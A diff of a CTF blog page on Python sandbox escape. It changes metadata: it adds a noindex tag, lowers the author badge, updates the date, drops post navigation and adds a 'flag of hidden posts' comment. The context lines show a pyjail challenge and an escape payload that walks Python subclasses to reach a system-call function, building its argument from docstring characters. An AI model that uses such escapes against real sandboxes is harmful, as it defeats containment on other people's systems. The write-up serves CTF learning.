@@ -12,7 +12,7 @@
             Python沙盒逃逸深度学习 |
         
         C3ngH&#39;s B10g
-    </title>
+    </title><meta name="robots" content="noindex">
     
 <link rel="stylesheet" href="/css/style.css">
 
@@ -250,7 +250,7 @@
                             <div class="author border-box">
                                 <span class="name">C3ngH</span>
                                 
-                                    <span class="author-badge">Lv3</span>
+                                    <span class="author-badge">Lv1</span>
                                 
                             </div>
                             <div class="meta-info border-box">
@@ -268,7 +268,7 @@
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Wed Jul 09 2025 20:53:00 GMT+0800">2025-07-09 20:53:00</span>
+                <span class="datetime" data-updated="Wed Oct 01 2025 20:36:36 GMT+0800">2025-10-01 20:36:36</span>
             </span>
         
 
@@ -1243,7 +1243,7 @@ or summary contain a given string such as “spam”, type “modules spam”.</
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">my_eval_func_002EFCDB = <span class="built_in">eval</span></span><br><span class="line">my_input_func_000FDCAB = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`+&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _   ____</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || | |___ \</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  __) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _||__ &lt;</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,\&quot;,&#x27;,+ Good luck!&quot;</span>)</span><br><span class="line">    input_data = my_input_func_000FDCAB(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_eval_func_002EFCDB(input_data)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 <p>再来试试join，也成功：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])](<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]]))</span><br></pre></td></tr></table></figure>
-
+<!-- flag of hidden posts -->
                     
                 </div>
 
@@ -1268,43 +1268,6 @@ or summary contain a given string such as “spam”, type “modules spam”.</
 
                 
 
-                
-                    <div class="post-nav border-box">
-                        
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/post/2024zjctfcs/"
-                                   title="2024 浙江省赛初赛 Misc方向 全WriteUp"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">2024 浙江省赛初赛 Misc方向 全WriteUp</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
-                        
-                            <div class="next-post">
-                                <a class="next"
-                                   rel="next"
-                                   href="/post/2024qwnt/"
-                                   title="2024强网拟态Misc方向部分 WriteUp"
-                                >
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">2024强网拟态Misc方向部分 WriteUp</span>
-                                        <span class="post-nav-item">下一篇</span>
-                                    </span>
-                                    <span class="right arrow-icon flex-center">
-                                        <i class="fas fa-chevron-right"></i>
-                                    </span>
-                                </a>
-                            </div>
-                        
-                    </div>
                 
 
                 
@@ -1432,7 +1395,7 @@ or summary contain a given string such as “spam”, type “modules spam”.</
             
                 <span class="count-item border-box word">
                     <span class="item-type border-box">总字数</span>
-                    <span class="item-value border-box word">67.2k</span>
+                    <span class="item-value border-box word">8.8k</span>
                 </span>
             
 
